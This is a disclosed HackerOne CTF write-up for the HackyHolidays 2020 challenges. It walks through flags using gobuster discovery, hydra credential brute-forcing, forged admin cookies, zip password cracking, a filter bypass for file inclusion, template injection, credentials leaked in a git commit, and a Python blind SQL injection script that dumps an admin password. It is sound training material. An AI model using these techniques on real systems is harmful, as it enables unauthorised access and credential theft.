# [H1 hackyholidays] CTF Writeup

## Report Details
- **Report ID**: 1069171
- **URL**: https://hackerone.com/reports/1069171
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-31T08:16:51.887Z
- **Disclosed**: 2021-01-12T17:59:35.162Z

## Reporter
- **Username**: macasun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Hello team,
Here is my CTF writeup for HackyHolidays.

# Main page

The main page doesn't contain any interesting stuff, just a few assets. Maybe we will find some known files in webapp root: `index.php`, `.htaccess`, `robots.txt`, ...? [robots.txt](https://hackyholidays.h1ctf.com/robots.txt) file exists, and there is the first flag:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

Also, there is a link to a hidden page `/s3cr3t-ar3a`. The source code of the page doesn't contain the flag, but it contains something interesting. First of all, there is `div` element with unused `alert` id (there are no css styles or scripts on the page where this id is used). Besides of this, jQuery library is loaded from the Grinch server, instead of public CDN (like as bootstrap css and js files):

- https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css
- https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js
- /assets/js/jquery.min.js

Searching for the string `alertbox` in /assets/js/jquery.min.js gives us the following code:

```js
h1_0 = 'la',
h1_1 = '}',
h1_2 = '',
h1_3 = 'f',
h1_4 = 'g',
h1_5 = '{b7ebcb75',
h1_6 = '8454-',
h1_7 = 'cfb9574459f7',
h1_8 = '-9100-4f91-';
document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```

To get the flag, let's copy and run the code above in the browser console (will replace `document.getElementById...` to `console.log(h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1)`).

Another way to get the second flag, open the browser inspector, and search for *flag* or select `div#alertbox` element. The flag will be in `data-info` attribute.

- The 1st flag: `flag{48104912-28b0-494a-9995-a203d1e261e7}`.
- The 2nd flag: `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`.

# People Rater

This app allows us to see how Grinch rates (hates:)) people.

There are two endpoints:
- `/page/:pageId` - returns the list of people
- `/entry?id=:id` - returns details about selected man

The most interesting endpoint here is `/entry`, the `id` parameter value is a base64 encoded string. For the first man, *Tea Avery*, it's `eyJpZCI6Mn0=` and decoded value is `{"id":2}`. It looks interesting, why id for the first man starts from 2, instead of 1? Let's check what the server will return for man with id=1.
1. JSON: `{"id":1}`.
2. base64 encoded string: `eyJpZCI6MX0=`.
2. Send request: `curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0%3D`.

The response will contain details about the Grinch's user and the flag:
```json
{
    "id":"eyJpZCI6MX0=",
    "name":"The Grinch",
    "rating":"Amazing in every possible way!",
    "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```

- The 3rd flag: `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`.

# Swag Shop

There is a simple app with products, where we can purchase any product, but to do that we must be logged in.

The app has four known API endpoints (most of them we can find in inline javascript):
- `GET /api/stock` - returns list of products
- `POST /api/purchase` - buy a product, authentication required
- `POST /api/login` - log in
- `GET /checkout` - opens or redirects to the check page?

Let's try to find more (hidden) endpoints. To do that let's run `gobuster` tool in *dir* mode:
```bash
$ gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api -w raft-small-directories.txt -t 50
```

`gobuster` will find two new endpoints:

- `/user` returns an error, if it's called without any parameter: `{"error":"Missing required fields"}`. Looks like it returns some information about a provided user.
- `/sessions` returns JSON object with a list of strings encoded in base64:

```json
{
  "sessions": [
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ=="
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
```

Each decoded session is JSON object with two fields: `user` and `cookie`. In most of them, `user` value is `null`, and only one has not null `user`:
```json
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```

Now, when we found user id, we can try to send it to `/api/user`, but we don't know the parameter name. To find it, let's run `gobuster` again, but now in *fuzz* mode:
```bash
$ gobuster fuzz -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 -w raft-small-words.txt -b 400 -t 50
```

And it will find the valid parameter name:
```
Found: [Status=200] [Length=216] https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
```

`curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043` will return the Grinch's user details in JSON format with the flag:

```json
{
  "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username":"grinch",
  "address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},
  "flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

- The 4th flag `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`.

# Secure Login

There is an app where we can log in. When we provide any username/password combination, server returns *Invalid Username* error message. I suppose, that server returns the different error messages for invalid username and password:

- When username is invalid, the error message is *Invalid Username*.
- When password is invalid, the error message is *Invalid Password*.

Using this information, let's run `hydra` tool to find the valid username, and using it, the valid password.
```bash
# find username
$ hydra -L ./names.txt -p pass hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:F=Invalid Username" -t 50 -I -f

# find password for username `access`
$ hydra -l access -P ./10k-most-common.txt hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:F=Invalid Password" -t 50 -I -f
```

`hydra` will find the valid credentials for us: `access`/`computer`.

Now, let's try to log in using them. The server will return `securelogin` cookie and the message in the body: *No Files To Download*. It seems that we haven't enough permissions to see the private data. Let's look at `securelogin` cookie. It's base64 encoded string: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`, decoded value is json object: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. Let's change `admin:false` to `admin:true` and encode json to base64: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==`. Now we will curl the url again, using the new cookie:

```bash
$ curl https://hackyholidays.h1ctf.com/secure-login -H "cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d"
```

The response body will contain a link to some secure zip file:
```html
<td><a href="/my_secure_files_not_for_you.zip">my_secure_files_not_for_you.zip</a></td>
```

Let's download it and try to open:
```bash
$ wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip -O /tmp/data.zip && unzip /tmp/data.zip
```

The archive is protected by password. To find the password we will use `John the Ripper` tool:
```bash
# create hash
$ zip2john /tmp/data.zip > /tmp/data.zip.hashes
# crack password
$ john /tmp/data.zip.hashes
```

`John` will find the password: `hahahaha`. Now unzip archive using the found password:

```bash
$ unzip sec-files.zip 
Archive:  sec-files.zip
[sec-files.zip] xxx.png password: 
  inflating: xxx.png
 extracting: flag.txt
```

And the flag will be in flag.txt file.

- The 5th flag: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`.

# My Diary

There is a calendar with Grinch's plans for December. The app url contains an interesting parameter `?template=entries.html`. Looks like that *Local/Remote file inclusion* attack is possible here. Awesome! Let's read content of `/etc/passwd`... But we can't, the server redirects us to `/my-diary/?template=entries.html` in most of the cases. It seems that it removes some letters from the template value before reading the file.

Ok, then let's try to find the hidden files in the app, we will run `gobuster` in *fuzz* mode using the list of web-content files:
```bash
$ gobuster fuzz -u https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ -t 50 -w raft-small-files.txt -b 302
```

`gobuster` will find `index.php` file with the following content:

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Now we see, that server really deletes all chars except ASC II letters, numbers and dots. And also it has `secretadmin.php` page, and there is some protection from reading its content.

Let's look at `str_replace` php function. It replaces all occurrences of the pattern in the input string. So `str_replace("admin.php", "", $page)` will return an empty string for the input `admin.php` or `admin.phpadmin.php`, **but**, if we inject the second `admin.php` somewhere in `admin.php`, the result will be `admin.php`:
```php
echo str_replace("admin.php", "", "admin.php"); // returns ""
echo str_replace("admin.php", "", "admiadmin.phpn.php"); // returns "admin.php"
```

To bypass the both conditions, we need to include `admin.php` and `secretadmin.php` twice, in the input string:

1. input string: `secretadmisecretaadmin.phpdmin.phpn.php`
2. after the first replace it becomes: `secretadmisecretadmin.phpn.php`
3. after the second replace it becomes: `secretadmin.php`

And `https://hackyholidays.h1ctf.com/my-diary/?template=secretadmisecretaadmin.phpdmin.phpn.php` returns the flag:

{F1138105}

- The 6th flag: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`.

# Hate Mail Generator

In this app we can create (in fact we cannot:() and preview email campaigns. There is already created a single campaign with name *Guess What*. 

Take a look at *Guess What* campaign:
- name: `Guess What`
- subject: `Guess What...`
- markup: `{{template:cbdj3_grinch_header.html}}Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}`

As we see, markup is written on some template language, there we can use fields from a dictionary, and include html templates via `template:` prefix followed by file name.

Cool, it looks pretty easy! We can read content of any file using `{{template:<file-name>}}` directive, right!? Let's read content of the magic `flag.txt` file!!! **In fact we cannot:(**! The server removes everything from `file-name`, except letters, numbers, dash, dot and underscore. And after that, adds the trimmed `file-name` to `/templates/` path.

Let's check the content of `/templates` folder, besides of the two known templates: `cbdj3_grinch_header.html` and `cbdj3_grinch_footer.html`, it contains the very interesting file `38dhs_admins_only_header.html`:

- `cbdj3_grinch_header.html`
- `cbdj3_grinch_footer.html`
- `38dhs_admins_only_header.html`

The server doesn't allow read any of these files directly, and when we include `38dhs_admins_only_header.html` in a new campaign markup, it returns an *Access denied* error. So we need to find another way how to read content of the admin template.

Let's look at new email campaign. It's impossible to create own campaign, the server returns an error message informing us about running out of credits. But we can preview our campaign. With the default data, the client sends two parameters in the body:
- `preview_markup`: `{{name}}`
- `preview_data`: `{"name":"Alice","email":"alice@test.com"}`

The template engine on the server uses our markup and dictionary. The most known server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed by server-side. Let's try to inject template engine directive `{{template:}}` into the template to bypass the access restrictions and read content of `38dhs_admins_only_header.html` file.

Preview a new campaign with the following data:
- `markup`: `{{payload}}`
- `data`: `{"payload":"{{template:38dhs_admins_only_header.html}}"}`

And finally, the server returns the content of `38dhs_admins_only_header.html` with the flag:

{F1138104}

- The 7th flag: `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`.

# Forum

There are some public and private posts in the forum app. The post with id=1 has two comments. Also there is `/login` page. We can't create own posts or add any comment to existing ones.
Let's run `gobuster` in *dir* mode to find the hidden pages:

```bash
$ gobuster dir -u https://hackyholidays.h1ctf.com/forum -w raft-small-directories.txt -t 50
```

- `/login`
- `/phpmyadmin`
- `/1`
- `/2`

And we see new `/phpmyadmin` page here. Unfortunately for us (hackers), and fortunately for site creators:), we can't use bruteforce attack here to find the valid login/password combination. Both pages `/login` and `/phpmyadmin` return the universal error message when the credentials are incorrect: *Username/Password Combination is invalid* and *Invalid username and password combination*.

So what to do? Let's start from the beginning and check the challenge details on [Twitter](https://twitter.com/Hacker0x01/status/1340280729129734144). The first comment contains information about the challenge creator - @adamtlangley. Googling this name, gives us the link to his GitHub account. There are two interesting repositories:
- https://github.com/adamtlangley/framework
- https://github.com/adamtlangley/stuff

The first one looks like a codebase for the current forum app. The second one is md5 cracker tool. This cracker tool was the wrong goal :(, I spent some time and found the encrypted password: `2901197737pepper` for the provided hash, but it didn't work on both login pages.

So one hope to the framework repo. The latest commit doesn't have any interesting things. But there are some nice changes in the commit [small fix](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae):
```php
static public function read(){
    if( gettype(self::$read) == 'string' ) {
        - self::$read = new DbConnect( false, 'forum', 'forum', '6HgeAZ0qC9T6CQIqJpD' );
        + self::$read = new DbConnect( false, '', '', '' );
    }
    return self::$read;
}
```

It looks like, that `forum` and `6HgeAZ0qC9T6CQIqJpD` are login/password for the forum and they were deleted in that commit.

Let's try to log in to `/phpmyadmin` using the found credentials. 
Yes! We logged in successfully. In phpmyadmin we see `forum` database and four tables: `comment`, `post`, `section` and `user`:

{F1138106}

We can't access almost all of them, except `user`:

```
|id | username | password                         | admin
|1  | grinch   | 35D652126CA1706B59DB02C93E0C9FBF | 1
|2  | max      | 388E015BC43980947FCE0E5DB16481D1 |
```

The table contains two users, *grinch* is admin, the passwords are md5 hashes. We can try to use `hashcat` tool to find the password, but firstly, let's try to find it on the web by hash. And we see it here: [https://md5.gromweb.com/?md5=35d652126ca1706b59db02c93e0c9fbf](https://md5.gromweb.com/?md5=35d652126ca1706b59db02c93e0c9fbf), the password is `BahHumbug` (it's on the line 365139 in rockyou.txt, but in the wrong case, no chances to bruteforce at all :))

Now, let's log in with `grinch/BahHumbug` on `/login` page. And finally we have access to the private, admin posts. There is only one post and it contains the flag:

{F1138107}

- The 8th flag: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`.

# Evil Quiz

In this app we must provide a name and the answers to three questions, and the system will calculate our score and gives us a hint how many users there with the same name.

Let's check what app will return for the same unique name *1asdsa2asda32asdsa1ds32*, posted twice (will clean cookies between posts). In the first case the number of the users with  this name will be 0, in the second case 1. What does this mean? It means, that on the server side, there is a SQL query, that looks like: `SELECT COUNT(*) FROM users WHERE name='input_name'`. Maybe SQL injection is possible in this query? Let's check it, with the following payload: `' or 1=1 -- `, the number of the users on the last step will be 40561! So the app is vulnerable to SQLi.

When we play a game, the client sends three mandatory requests in the following order:

- `POST /evil-quiz` with name
- `POST /start` with answers
- `GET /score`

The requests must be send in the order shown above. Because of this, we can't use well known `sqlmap` tool, because these three requests must be send each after another, and the injection result is available only on the last step.

Let's create own python script that will dump database, and possibly, will give us username and password to log in. The algorithm of work looks like:

1. Send `GET` request to `/evil-quiz` to generate new cookies.
2. Send `POST` request to `/evil-quiz` with payload in name field.
3. Send `POST` request to `/start` with default answers.
4. Grep the response body for `There is (\d+) other` and select the number. If the value is greater than 0, then the injection result is positive.

To exclude the possible matches, we need to use the really random name `jghuyqhfyxjgh123` to be sure that nobody is using it yet.

Let's create a few payloads. To get schema name, table names and table column names, we will use payload with case insensitive  `LIKE` operator. To get password, we will use case sensitive `LIKE BINARY` operator. To decrease the number of requests, unused characters from the charset will be excluded.

1. Get schema name:
   1. `select count(*) from information_schema.schemata where schema_name != "information_schema" and schema_name like "' + tmp_known + '%" limit 1`
2. Get table name with users in schema *quiz*:
   1. `select count(*) from information_schema.tables where table_schema like "quiz" and table_name like "' + tmp_known + '%" limit 1`
3. Get column names in the *admin* table:
   1. `select count(*) from information_schema.columns where table_schema like "quiz" and table_name="admin" and column_name like "' + tmp_known + '%" limit 1`
   2. ``select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id") and column_name like "' + tmp_known + '%" limit 1`
   3. `select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id","password") and column_name like "' + tmp_known + '%" limit 1`
4. Get record values in *admin* table:
   1. `select count(*) from quiz.admin where username like "' + tmp_known + '%" limit 1`
   2. ``select count(*) from quiz.admin where username="admin" and password like binary "%' + temp_char + '%" limit 1`
   3. `select count(*) from quiz.admin where username="admin" and password like binary "' + tmp_known + '%" limit 1`

Python script to dump db:

```python
import requests as req
import string
import re

QUIZ_URL = 'https://hackyholidays.h1ctf.com/evil-quiz'
START_URL = 'https://hackyholidays.h1ctf.com/evil-quiz/start'
POST_HEADERS = {
  'Content-Type': 'application/x-www-form-urlencoded'
}

def send_sqli(query):
  session = req.session()
  session.get(QUIZ_URL) # to generate cookies
  session.post(
    QUIZ_URL,
    headers=POST_HEADERS,
    data={'name': 'jghuyqhfyxjgh123' + query}
  )
  res = session.post(
    START_URL,
    headers=POST_HEADERS,
    data='ques_1=0&ques_2=0&ques_3=0'
  )
  count_match = re.search(r'There is (\d+) other', res.text)
  if count_match:
    return int(count_match.group(1)) > 0
  print('Match not found')
  exit(0)

def get_charset():
  charset = ''
  base_charset = string.digits + string.ascii_letters + string.punctuation + ' '
  for char in base_charset:
    temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char

    query = 'select count(*) from quiz.admin where username="admin" and password like binary "%' + temp_char + '%" limit 1'
    query = '\' or ({}) = 1 -- '.format(query)
    print(query)

    if (send_sqli(query)):
      charset += char
      print(char)
  return charset

def get_data():
  known = ''
  known_max_len = 20
  charset = get_charset()
  print(charset)
  while True:
    found_next = False
    for char in charset:
      temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char
      tmp_known = known + temp_char

      query = 'select count(*) from quiz.admin where username="admin" and password like binary "' + tmp_known + '%" limit 1'
      query = '\' or ({}) = 1 -- '.format(query)
      print(query)

      if (send_sqli(query)):
        known += char
        found_next = True
        print(known)
        break
    if (not found_next):
      print('Unable to find the next char, terminating')
      exit(0)
    elif (len(known) == known_max_len):
      print('Found the first {} chars: {}'.format(known_max_len, known))
      exit(0)

get_data()
```

When all payloads will be executed, we will get the database dump:
```
quiz
  admin
    id = 1
    password = S3creT_p4ssw0rd-$
    username = admin
```

Let's log in using the found credentials, and there will be the flag:

{F1138108}

- The 9th flag: `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`.

# Signup Manager

This app allows us to log in or signup. To sign up, we need to provide five parameters: `username`, `password`, `age`, `firstname` and `lastname`.

When we use existing username on signup, the server returns *Username already exists* error. When username is unique, the server creates a new user and returns the following page:

{F1138110}

Login/password bruteforce attack is impossible here, because the server returns the universal error message when the credentials are incorrect.

Let's take a look at the source code of the main page. On the top line there is `<!-- See README.md for assistance -->` HTML comment. https://hackyholidays.h1ctf.com/signup-manager/README.md returns the following content:

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

# How to Install
1. Create a directory that you wish SignUp Manager to be installed into
2. Move signupmanager.zip into the new directory and unzip it
3. For security move users.txt into a directory that cannot be read from website visitors
4. Update index.php with the location of your users.txt file
5. Edit the user and admin php files to display your hidden content
6. You can make anyone an admin by changing the last character in the users.txt file to a Y
7. Default login is admin / password
```

As we see, there is a small instruction how to install *Signup Manager* app. The users data is stored somewhere on the disk, and if the last character of the user record is `Y`, then this user is an admin. Also there is a name of zip archive *signupmanager.zip*. Let's try to download it. The archive contains a few files:

- admin.php
- index.php
- user.php
- signup.php
- README.md

Let's look at index.php code. There are two functions: `buildUsers` and `addUser`.

- `buildUsers` - loads all the users from the file into array, and for each string, creates a record with user details parsing this string. This function is calling on each request.
- `addUser` - creates user string by a special format and adds it into the users file, sets the last letter of the string to `N` (not admin).

```php
function buildUsers() {
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ) {
        if(strlen($user_str) == 113) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}

function addUser($username,$password,$age,$firstname,$lastname) {
    $random_hash = md5(print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand());
    $line = '';
    $line .= str_pad($username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad($age,3,"#");
    $line .= str_pad($firstname,15,"#");
    $line .= str_pad($lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL,FILE_APPEND);
    return $random_hash;
}
```

If request contains *cookie* header, the app searches for an user record where `user.cookie` is equal to `request.cookie.token`. If user is found, the app redirects to `/admin.php` if  `user.admin` is true, or to `/user.php` otherwise.

```php
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
```

Also there is a logic for processing *login* and *signup* actions.

- on *login* action the app searches for user record where `user.password` is equal to password md5 hash from the body. If user is found, the app sets cookie and redirects to the main page.
- on *signup* action the app validates five user fields:
  - removes non letters and numbers from `username`, `firstname` and `lastname`, validates that they have length less or equal to 15 letters.
  - creates md5 hash of the `password`.
  - validates that `age` is the number, its length is less or equal to 3 and converts its value to the number.
  - if there are no errors, the app calls `addUser` function, sets cookie token and redirects to the main page.

```php
if($page == 'signup.php') {
    $errors = array();
    if (isset($_POST["action"])) {
        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
            if( isset($all_users[ $_POST["username"] ]) ){
                $u = $all_users[ $_POST["username"] ];
                if( md5($_POST["password"]) === $u["password"] ){
                    setcookie('token', $u["cookie"], time() + 3600);
                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                    exit();
                }
            }
            $errors[] = 'Username and password combination not found';
        }
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
```

Let's look at the user record string format:

- `username` => max length 15, if less, left padded by `#`.
- `password` => md5 hash, always has length 32 chars.
- `random_hash` => md5 hash generated by random data, always has length 32 chars.
- `age` => max length 3, if less, left padded by `#`.
- `firstname` and `lastname` the same as `username`.
- the last char: `N`.

Ok, so the goal is to create an user record string with *such* data, where the last letter will be `Y` (admin). The length of the string is 113 chars. We can't exceed the max length of `username`, `firstname` and `lastname`. The length of `password` and ``random_hash` is fixed. But what about `age`?

In PHP, the number can be presented in the different forms, and one of them is *scientific notation*: `1e1` equals to `10` in decimal form. 

Let's look again how `age` is processed in *signup* action:

```php
if (!is_numeric($_POST["age"])) {
    $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
    $errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
```

If `age` parameter value will be equal to `1e9`, the both conditions will be passed, and in the end, the string `1e9` will be converted to the number `1000000000`. Later, in the `addUser` function where the user record string is generated, the number `1000000000` will be converted to the string `1000000000`.

We have done it! Now we can create a user record, where the last letter is `Y`.

- `username`=`johnsmith3`
- `password`=`pass$%^&`
- `age`=`1e9`
- `firstname`=`john`
- `lastname`=`smithYYYYYYYYYY`

The generated user record string is:

```
johnsmith3#####1a1dc91c907325c69271ddf0c944bc72ffd371da9900ca21d7c9aad6bc6f1bec1000000000john###########smithYYYY
```

Let's signup using the user details described above, and we will get the flag:

{F1138109}

- The 10th flag: `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`.

# Grinch Recon

When, we have solved the challenge 10, we are given the link to the challenge 11: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59.

There is a photo album app, with three albums and some photos in each album. There are two known and two hidden paths (we will get them with `gobuster` running it in *dir* mode: `gobuster dir -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 -w raft-small-directories.txt -t 50`): 

- `/album?hash=hash`
- `/picture?data=base64`
- `/uploads`
- `/api`

### /api

